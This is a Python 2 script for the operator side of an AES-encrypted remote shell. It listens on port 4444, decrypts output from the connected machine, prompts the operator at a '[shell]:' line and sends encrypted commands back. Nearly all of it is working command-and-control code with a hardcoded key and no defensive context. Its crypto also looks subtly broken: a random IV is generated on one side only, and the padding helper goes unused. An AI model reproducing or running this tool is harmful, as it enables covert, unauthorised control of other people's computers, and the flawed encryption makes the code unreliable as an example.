#!/usr/bin/env python

from Crypto.Cipher import AES
import socket
import base64
import os

# the block size for the cipher object; must be 16, 24, or 32 for AES
from __builtin__ import raw_input

BLOCK_SIZE = 32

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# create a cipher object using the random secret
iv = os.urandom(16)
cipher = AES.new(secret,AES.MODE_CFB, iv)

# encode a string
# encoded = EncodeAES(cipher, 'password')
# print 'Encrypted string:', encoded

# decode the encoded string
# decoded = DecodeAES(cipher, encoded)
# print 'Decrypted string:', decoded

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 4444))
c.listen(1)
s,a = c.accept()

while True:
	# receive encrypted data
	data = s.recv(1024)
	
	# decrypt data
	decrypted = DecodeAES(cipher, data)
	
	# check for end of file
	if decrypted.endswith("EOFEOFEOFEOFEOFX") == True:
		
		# print command
		print decrypted[:-16]
		
		# get next command
		nextcmd = raw_input("[shell]: ")
		
		# encrypt that $#!^
		encrypted = EncodeAES(cipher, nextcmd)
		
		# send that $hit
		s.sendto(encrypted, (a[0],a[1]))
		
	# else, just print
	else:
		print decrypted